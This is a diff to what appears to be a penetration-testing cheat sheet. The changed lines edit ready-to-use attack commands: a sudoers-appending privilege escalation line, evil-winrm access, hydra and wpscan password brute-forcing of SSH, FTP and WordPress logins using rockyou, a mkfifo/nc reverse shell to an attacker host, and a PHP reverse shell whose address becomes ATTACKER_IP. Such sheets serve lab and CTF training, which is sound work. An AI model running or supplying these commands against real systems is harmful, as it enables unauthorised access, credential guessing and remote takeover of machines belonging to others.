@@ -99,6 +99,12 @@ echo 'echo "<USER_NAME> ALL=(ALL:ALL) ALL" >> /etc/sudoers;' >> <FILE_NAME>
 
 # Windows Privilege Escalation and System Commands
 
+## Privilege and Permission Analysis
+
+```bash
+whoami /priv
+```
+
 ```bash
 evil-winrm -i <TARGET_IP> -u <USER_NAME> -p <PASSWORD>
 ```
@@ -146,23 +152,27 @@ crunch 18 18 -t '@@@@' > file.txt
 ## Network Service Brute Force Attacks
 
 ```bash
-hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ssh://<ATTACKER_IP>
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
 ```
 
 ```bash
-hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ftp://<ATTACKER_IP>
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
 ```
 
 ```bash
-hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <ATTACKER_IP> http-get -s 8080 /
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get -s 8080 /
 ```
 
 ```bash
-hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
 ```
 
 ```bash
-hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 32
+```
+
+```bash
+wpscan --url <TARGET_IP> -U <LOGIN> -P /usr/share/wordlists/rockyou.txt
 ```
 
 ## Archive Password Cracking
@@ -237,7 +247,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 44
 
 ```php
 <?php
-$ip = '0.0.0.0';
+$ip = '<ATTACKER_IP>';
 $port = 4444;
 
 $sock = fsockopen($ip, $port);
